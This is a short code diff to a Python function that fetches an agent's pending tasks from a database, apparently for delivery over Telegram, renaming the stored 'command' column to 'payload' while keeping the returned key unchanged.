@@ -163,7 +163,7 @@ def telegram_get_commands(agent_id: str) -> list:
             
             # Get pending tasks for this agent
             db.execute("""
-                SELECT id, task_type, command 
+                SELECT id, task_type, payload 
                 FROM tasks 
                 WHERE agent_id = ? AND status = 'pending'
                 ORDER BY created_at ASC
@@ -174,7 +174,7 @@ def telegram_get_commands(agent_id: str) -> list:
                 commands.append({
                     "id": row["id"],
                     "type": row["task_type"],
-                    "command": row["command"]
+                    "command": row["payload"]
                 })
                 # Mark as sent
                 db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (row["id"],))
